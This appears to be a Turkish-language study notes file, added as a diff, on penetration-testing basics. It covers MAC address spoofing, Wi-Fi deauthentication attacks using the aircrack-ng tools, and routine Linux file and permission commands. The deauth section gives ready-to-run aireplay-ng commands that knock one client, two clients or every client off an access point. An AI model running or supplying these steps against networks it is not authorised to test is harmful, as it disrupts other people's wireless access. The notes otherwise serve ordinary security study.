@@ -1,0 +1,103 @@
+	TEMELLER
+  MAC Adresi Değiştirme Alternatifleri
+macchanger --help
+
+
+ First WAY
+ifconfig wlan0 down -> yazarak wlan0'ı devre dışı bırakabilirsiniz.
+macchanger --random wlan0
+ifconfig wlan0 up  -> yazarak wlan0'ı tekrar aktif edebiliriz.
+
+
+ Second WAY:
+service NetworkManager restart "veya" service network-manager restart
+ifconfig wlan0 down
+ifconfig wlan0 hw ether 00:44:55:66:77:88 -> Hardware'ın (cihazın) etherini değiştir.
+					  -> Başında 00 olacak şekilde rastgele ether değeri girebilirsiniz.
+ifconfig wlan0 up
+
+
+
+
+	YETKİSİZLENDİRME
+  Deauth Saldırıları
+airmon-ng start wlan0	-> Monitor moda geçiş yaptık.
+airodump-ng wlan0mon	-> Etraftan gelen giden paketleri dinlemeyi başlatıyoruz.
+airodump-ng --bssid 88:41:FC:19:B4:5B --channel 11 wlan0mon
+aireplay-ng --deauth 1000 -a 88:41:FC:19:B4:5B -c 06:E9:84:18:81:A3 wlan0mon
+
+ Aynı anda 2 cihaza Deauth saldırısı yapmak.
+aireplay-ng --deauth 1000 -a 88:41:FC:19:B4:5B -c 06:E9:84:18:81:A3 wlan0mon &> /dev/null& -> Arka planda deauth saldırımız çalışıyor ve aynı zamanda &(ve) işareti kullanarak outputumuzu başka bir yere (null klasörüne yani boşluğa) yönledirdik.
+aireplay-ng --deauth 1000 -a 88:41:FC:19:B4:5B -c 66:51:87:86:23:59 wlan0mon &> /dev/null&
+
+ Arka planda çalışan işlemleri görüntülemek için:
+jobs
+ Herhangi birini durdurmak için:
+kill %2  -> [2] adlı işlemi durdurur.
+killall aireplay-ng -> tüm işlemleri durdurur.
+
+
+  Tüm Cihazları Yetkisizlendirmek
+aireplay-ng --deauth 1000 -a 88:41:FC:19:B4:5B wlan0mon
+
+ No Such BSSID available hatası alırsak	:
+airodump-ng --bssid 88:41:FC:19:B4:5B --channel 11 wlan0mon
+ ...komutu ile aynı anda çalıştır.
+
+
+-Bilgi notu: Deauth atıldığında yükselen değerler internet kullanın miktarından ziyade atılan deauth paketlerini temsil etmektedir.
+
+
+
+
+	Linux Komutları
+uname -a	-> Cihazın hangi işletim sisteminde, versiyonunda kullanıldığını gösterir.
+history		-> Sanal makinede terminal kullanılarak yazılan son 1000 komutu gösterir.
+touch turgayk	-> Uzantısı olmayan bir dosya oluşturduk.
+ls		-> İçinde bulunduğunuzun dosyanın içeriğini gösterir.
+ls -l		-> Bunu daha detaylı bir şekilde yapar.
+
+
+
+
+  İzinler ve Sahiplik
+
+ İzinler
+ls -l   -> Çalıştırdığımızda bize o dosya içeriğini detaylı göstermişti.
+	-> Bu dosyanın içeriklerindeki izinler nasıl değiştirilir?
+
+örnek: -rw (r:read, w:write) bu dosyanın sadece okuma ve yazmaya izni var.
+
+ Bu izinleri değiştirmek için:
+chmod 700 turgayk	-> Artık dosyamızın okuma, yazma ve execute etme izin var.
+
+ Varolan tüm izinleri vermek istiyorsak:
+chmod 777
+
+ Default verilen izinler:
+chmod 644
+
+ Hangi dosyaya hangi izni verceğimizi Chmod Numbers üzerinden öğrenebiliriz.
+ http://catcode.com/teachmod/numeric.html
+
+
+ Sahiplik
+cat /etc/passwd
+chown sys:sys turgayk	-> chown "owner için :group için" turgayk
+ -> root, root olan sahipliği sys, sys diye değiştirdik.
+
+
+
+
+ Dosya Kopyalamak ve Taşımak:
+cp turgayk /root/Downloads -> turgayk dosyası /root/Downloads içerisine kopyalandı.
+mv turgayk /root/Downloads -> turgayk dosyası /root/Downloads içerisine taşındı.
+rm turgayk /root/Downloads -> Dosya silinecektir.	-> rm -rf Şeklimde dosya silme işlemi de yapabiliriz.
+ifconfig | grep -i inet	   -> ifconfigde içerisinde inet geçen değerleri göster.
+
+
+
+
+ İşe yarayabilecek diğer websiteleri:
+https://www.cyberciti.biz/faq/unix-linux-bsd-chmod-numeric-permissions-notation-command/
+https://www.linux.com/topic/desktop/how-manage-users-groups-linux/
